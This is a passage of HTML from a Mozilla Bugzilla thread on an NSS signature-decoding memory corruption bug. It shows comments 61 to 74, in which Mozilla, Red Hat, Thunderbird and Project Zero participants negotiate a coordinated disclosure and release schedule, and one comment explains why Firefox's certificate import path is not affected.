                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-61" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c61">Comment 61</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-04 07:02 PDT" data-time="1636034538">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-61">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-61" data-comment-id="15642365"><p>(In reply to Kai Engert (:KaiE:) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c58" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #58</a>)</p>
<blockquote>
<p>I don&#39;t know if the following is necessary, but here are my thoughts and questions:</p>
</blockquote>
<p>Always useful, thanks for your thoughts Kai ! : )</p>
<p>I am not yet able to give you a complete story for the timeline as I am still discussing the possibilities with Fx Release Management. However it looks like we are moving towards a solution that is quite close to what you suggested above and where Firefox release and ESR are patched roughly at the same time as we make the fix public. I&#39;ll get back to all of you here as soon as I know more...</p>
</div></div><div class="change-set" id="c62"><div class="comment" data-id="15647426" data-no="62"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-62" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a783068_11099"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a783068_11099"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-62"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-62" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c62">Comment 62</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-08 01:00 PST" data-time="1636362032">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-62">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-62" data-comment-id="15647426"><p>Dan, can you please comment on which versions of Firefox you&#39;d like to be patched please? Thanks : )</p>
</div><div class="activity"><div class="change">Flags: needinfo?(dveditz)</div></div></div><div class="change-set" id="c63"><div class="comment" data-id="15650231" data-no="63"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-63" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a783068_11099"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a783068_11099"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-63"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-63" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c63">Comment 63</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-09 10:06 PST" data-time="1636481213">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-63">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-63" data-comment-id="15650231"><p>Are we OK having the distros ship fixes, with Firefox fixing the issue 5 days later?  That&#39;s essentially what would happen with a Dec 02 date. We could do an RC2 and hold off on the ESR 91.4 RC until the patches land on that date (for a Dec 7 release), but we wouldn&#39;t be able to get a new 94.0.x update and shipped then with all the release and QA teams focused on the Dec 7 releases.</p>
<p>We don&#39;t have a &quot;94.0.x&quot; update release already planned, at least not in a reliable enough way we could pin a distro disclosure timeline to, and the impact to Firefox doesn&#39;t appear severe enough to force a chemspill on its own.</p>
<p>Timing aside, The versions I&#39;d like to see fixed are Firefox 95.0 (Release) and Firefox ESR 91.4.  it looks like the distro list disclosure rules would consider us landing patches as a &quot;disclosure&quot;, and in order to ship in those releases we would have to make builds on that Dec 2 date at the latest.</p>
<p>If we have an alternate way to disable the functionality outside of NSS that doesn&#39;t hint at the problem then Dec 7 would be a better disclosure date. We could have included the non-revealing Firefox patch in those releases, and then release NSS point releases with the patch on that date. The NSS patches wouldn&#39;t be in the Firefox releases, but they could than land on Nightly and Beta.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(dveditz)</span></div></div></div><div class="change-set" id="c64"><div class="comment" data-id="15650259" data-no="64"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-64" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a783068_11099"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a783068_11099"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-64"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-64" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c64">Comment 64</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-09 10:30 PST" data-time="1636482649">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-64">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-64" data-comment-id="15650259"><p>Thanks! John is looking at fixing Firefox separately from the NSS fix by using a Policy, so we might have a bit more freedom for scheduling the NSS release. We&#39;ll report back here when we know if this actually works well... : )</p>
</div></div><div class="change-set" id="c65"><div class="comment" data-id="15653222" data-no="65"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-65" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_689878" id="a783068_11099"><img src="https://secure.gravatar.com/avatar/291ff310b7805a4159d7f46af196813e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_689878" id="a783068_11099"><a class="email " href="/user_profile?user_id=689878" > <span class="fna">John Schanck [:jschanck]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-65"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-65" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c65">Comment 65</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-11 10:32 PST" data-time="1636655574">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-65">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-65" data-comment-id="15653222"><p>As Dennis mentioned in <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1737470#c50">comment 50</a>, we were initially concerned that Firefox was vulnerable through the client certificate import dialog.</p>
<p>I&#39;ve reviewed the relevant function, <code>nsPKCS12Blob::ImportFromFile</code> , and found that it is not vulnerable. The attacker would have to provide an RFC 7292 PFX structure with a zero-length macData field (<a href="https://searchfox.org/mozilla-central/source/security/nss/lib/pkcs12/p12d.c#1478" rel="nofollow">because of this branch</a>).  Zero-length macData fields are allowed by the standard, but not by <a href="https://searchfox.org/mozilla-central/source/security/nss/lib/pkcs12/p12tmpl.c#196" rel="nofollow">the ASN.1 template</a> that <code>SEC_PKCS12DecoderStart</code> selects for parsing PFX structures. So it&#39;s impossible to hit the vulnerable <code>SEC_PKCS7VerifySignature</code> path in <code>SEC_PKCS12DecoderVerify</code> when the input <code>SEC_PKCS12DecoderContext</code> is initialized using <code>SEC_PKCS12DecoderStart</code>, as it is in <code>nsPKCS12Blob::ImportFromFile</code>.</p>
<p>Our current assessment is that Firefox is not vulnerable to this bug, and a separate non-revealing Firefox patch is not necessary.</p>
</div></div><div class="change-set" id="c66"><div class="comment" data-id="15659519" data-no="66"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-66" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a783068_11099"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a783068_11099"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-66"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-66" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c66">Comment 66</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-16 10:21 PST" data-time="1637086893">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-66">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-66" data-comment-id="15659519"><p>Hi all,<br>
If we are confident - say mid-next week - that we identified the few actors that we want to notify early and have a valid patch, we could be ok for including the fix in releases of NSS in this cycle (December 2nd). In that case we could selectively disclose on Wed Nov 24th which is a one week notice.</p>
<p>Bob, Kai, can you confirm that there is no blockage for you if we attempt to fix and publicly disclose for the next NSS release on Dec 2nd and are we ok with only having the fix in NSS 3.73+ and NSS 3.68 ESR ?</p>
<p>I&#39;ve asked Dennis to take over coordination of the disclosure on our side and he will likely provide a status update here soon.</p>
</div><div class="activity"><div class="change">Flags: needinfo?(rrelyea)</div><div class="change">Flags: needinfo?(kaie)</div></div></div><div class="change-set" id="c67"><div class="comment" data-id="15659542" data-no="67"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-67" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_11099" id="a783068_11099"><img src="https://secure.gravatar.com/avatar/4e29cfbfaece102427b6d6aa84d135f5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_11099" id="a783068_11099"><a class="email " href="/user_profile?user_id=11099" > <span class="fna">Robert Relyea</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-67"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-67" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c67">Comment 67</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-16 10:35 PST" data-time="1637087713">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-67">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-67" data-comment-id="15659542"><p>My biggest issue with the plan is Nov 24th is the day before thanksgiving.  For me, we are trying to get embargoed builds done this week, but for anyone that gets noticed on Nov24th, you are generating a bad Thanksgiving Holiday for them, It would probably be better to give notice after Thanksgiving and push the NSS release cycle out one week.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(rrelyea)</span></div></div></div><div class="change-set" id="c68"><div class="comment" data-id="15660422" data-no="68"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-68" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_331752" id="a783068_11099"><img src="https://secure.gravatar.com/avatar/0906041fcade715bfd1cb25f1d12cb8d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_331752" id="a783068_11099"><a class="email " href="/user_profile?user_id=331752" > <span class="fna">Huzaifa Sidhpurwala</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-68"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-68" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c68">Comment 68</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-17 02:42 PST" data-time="1637145734">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-68">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-68" data-comment-id="15660422"><p>So, unembargo date is 2nd dec ? and not Nov 24th right?</p>
</div></div><div class="change-set" id="c69"><div class="comment" data-id="15660761" data-no="69"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-69" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a783068_11099"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_36541" id="a783068_11099"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-69"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-69" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c69">Comment 69</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-17 06:44 PST" data-time="1637160277">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-69">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-69" data-comment-id="15660761"><p>(In reply to Benjamin Beurdouche [:beurdouche] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c66" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #66</a>)</p>
<blockquote>
<p>Bob, Kai, can you confirm that there is no blockage for you if we attempt to fix and publicly disclose for the next NSS release on Dec 2nd ...</p>
</blockquote>
<p>No block from Thunderbird perspective, we have already shipped the workaround in release 91.3.0 and beta 95.0b1.</p>
<blockquote>
<p>... and are we ok with only having the fix in NSS 3.73+ and NSS 3.68 ESR ?</p>
</blockquote>
<p>The NSS team usually didn&#39;t provide support for older NSS versions - but everyone distributing older NSS versions must apply the required patch. It should be made clear which patch needs to be applied. It should be made clear that e.g. everyone distributing Gnome Evolution is highly vulnerable and needs to ship NSS with the fixed patch ASAP (on the coordinated date).</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(kaie)</span></div></div></div><div class="change-set" id="a2072998_600971"><div class="change" id="aa2072998_600971">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_600971" id="a2072998_600971"><img src="https://secure.gravatar.com/avatar/a088418052679d9583556d277e6774ee?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_600971" id="a2072998_600971"><a class="email " href="/user_profile?user_id=600971" > <span class="fna">Phabricator Automation</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a2072998_600971"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a2072998_600971">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a2072998_600971">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-17 06:49 PST" data-time="1637160555">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9247769&amp;action=edit"
           title="Bug 1737470 - Ensure DER encoded signatures are within size limits. r=jschanck,mt,bbeurdouche,rrelyea"
           class=""
        >Attachment #9247769</a> -
        Attachment description: WIP: Bug 1737470 - Ensure DER encoded signatures are within size limits. &rarr; Bug 1737470 - Ensure DER encoded signatures are within size limits. r=jschanck,mt,bbeurdouche,rrelyea</div></div></div><div class="change-set" id="c70"><div class="comment" data-id="15661030" data-no="70"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-70" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_11099" id="a2072998_600971"><img src="https://secure.gravatar.com/avatar/4e29cfbfaece102427b6d6aa84d135f5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_11099" id="a2072998_600971"><a class="email " href="/user_profile?user_id=11099" > <span class="fna">Robert Relyea</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-70"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-70" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c70">Comment 70</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-17 08:57 PST" data-time="1637168269">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-70">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-70" data-comment-id="15661030"><p>Huzaifa, yes, but the distros are notified on the 24th they don&#39;t really have a full week to get their code together and get builds ready. Also I&#39;m off on Thanksgiving, so we need to get the release machinery running <em>this week</em> or there will be no one at Red Hat to create the builds for QA, since already know about this.</p>
</div></div><div class="change-set" id="c71"><div class="comment" data-id="15661049" data-no="71"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-71" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a2072998_600971"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" id="a2072998_600971"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-71"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-71" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c71">Comment 71</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-17 09:14 PST" data-time="1637169255">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-71">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-71" data-comment-id="15661049"><p>Has Mozilla/Red Hat allocated a CVE for this issue? I think Huzaifa might know for Red Hat.</p>
<p>I would prefer not to rush all the other distros - Red Hat has a big head start - I imagine Debian and others will want time to do some back porting and can&#39;t just apply the patch.</p>
<p>Is there any objection to informing the vendors list tomorrow? I can take care of letting them know. That will still be 14 days until the 2nd.</p>
</div></div><div class="change-set" id="c72"><div class="comment" data-id="15661078" data-no="72"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-72" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_11099" id="a2072998_600971"><img src="https://secure.gravatar.com/avatar/4e29cfbfaece102427b6d6aa84d135f5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_11099" id="a2072998_600971"><a class="email " href="/user_profile?user_id=11099" > <span class="fna">Robert Relyea</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-72"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-72" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c72">Comment 72</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-17 09:31 PST" data-time="1637170302">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-72">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-72" data-comment-id="15661078"><p>I definitely think we need to inform the other distros sooner if we want to keep the 2nd as the release date.</p>
</div></div><div class="change-set" id="c73"><div class="comment" data-id="15661151" data-no="73"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-73" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_644159" id="a2072998_600971"><img src="https://secure.gravatar.com/avatar/46fbd084ad1a893caecbb3d539951e40?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_644159" id="a2072998_600971"><a class="email " href="/user_profile?user_id=644159" > <span class="fna">Dennis Jackson</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-73"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-73" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c73">Comment 73</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-17 10:29 PST" data-time="1637173774">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-73">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-73" data-comment-id="15661151"><p>(In reply to taviso from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c71" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #71</a>)</p>
<blockquote>
<p>Has Mozilla/Red Hat allocated a CVE for this issue? I think Huzaifa might know for Red Hat.</p>
</blockquote>
<p>Mozilla will allocate. Dan, can you handle this?</p>
<blockquote>
<p>Is there any objection to informing the vendors list tomorrow? I can take care of letting them know. That will still be 14 days until the 2nd.</p>
</blockquote>
<p>Please don&#39;t. I&#39;d also rather that the disclosure comes from Mozilla as this is a good reflex for us to exercise.</p>
<blockquote>
<p>My biggest issue with the plan is Nov 24th is the day before thanksgiving.</p>
</blockquote>
<p>Thanks for the feedback Kai &amp; Bob.</p>
<p>Let&#39;s avoid Thanksgiving entirely and move the disclosure date back to Monday 29th of November and release the embargo on Thursday the 9th of December. This means we can include a finalised patch with the disclosure and give everybody 8 working days to get their ducks in a row.</p>
<p>Benjamin is okay with pushing the NSS release date to the 9th of Dec and it sounds like this is also fine for Thunderbird and Red Hat.</p>
</div><div class="activity"><div class="change">Flags: needinfo?(dveditz)</div></div></div><div class="change-set" id="c74"><div class="comment" data-id="15661237" data-no="74"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-74" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a2072998_600971"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" id="a2072998_600971"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-74"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-74" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c74">Comment 74</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-17 11:36 PST" data-time="1637177818">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-74">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-74" data-comment-id="15661237"><p>(In reply to Dennis Jackson from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c73" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #73</a>)</p>
<blockquote>
<p>(In reply to taviso from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c71" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #71</a>)</p>
<blockquote>
<p>Has Mozilla/Red Hat allocated a CVE for this issue? I think Huzaifa might know for Red Hat.</p>
</blockquote>
<p>Mozilla will allocate. Dan, can you handle this?</p>
</blockquote>
<p>Sounds good to me, thanks!</p>
<blockquote>
<blockquote>
<p>Is there any objection to informing the vendors list tomorrow? I can take care of letting them know. That will still be 14 days until the 2nd.</p>
</blockquote>
<p>Please don&#39;t. I&#39;d also rather that the disclosure comes from Mozilla as this is a good reflex for us to exercise.</p>
</blockquote>
<p>It&#39;s the norm for reporters to post, but I don&#39;t mind letting you do it. Could you let me review the post before sending it?</p>
<blockquote>
<blockquote>
<p>My biggest issue with the plan is Nov 24th is the day before thanksgiving.</p>
</blockquote>
<p>Thanks for the feedback Kai &amp; Bob.</p>
<p>Let&#39;s avoid Thanksgiving entirely and move the disclosure date back to Monday 29th of November and release the embargo on Thursday the 9th of December. This means we can include a finalised patch with the disclosure and give everybody 8 working days to get their ducks in a row.</p>
<p>Benjamin is okay with pushing the NSS release date to the 9th of Dec and it sounds like this is also fine for Thunderbird and Red Hat.</p>
</blockquote>
<p>There is an issue here,  our (Project Zero) policies dictate what I&#39;m required to do 30 days after any &quot;fix&quot; is &quot;made available&quot;. I understand the Thunderbird patch was not a complete fix, but if I accept that interpretation, then other (less cooperative) vendors can game our policies by releasing partial fixes and then blocking public disclosure. I would really prefer to avoid setting that precedent, not all vendors are as diligent as Mozilla.</p>
<p>It would really make my life a lot simpler if we try to keep it before the 4th.</p>
</div></div><div class="change-set" id="c75"><div class="comment" data-id="15661554" data-no="75"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-75" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_11099" id="a2072998_600971"><img src="https://secure.gravatar.com/avatar/4e29cfbfaece102427b6d6aa84d135f5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_11099" id="a2072998_600971"><a class="email " href="/user_profile?user_id=11099" > <span class="fna">Robert Relyea</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-75"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-75" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c75">Comment 75</a>
          </h3>
          &bull;
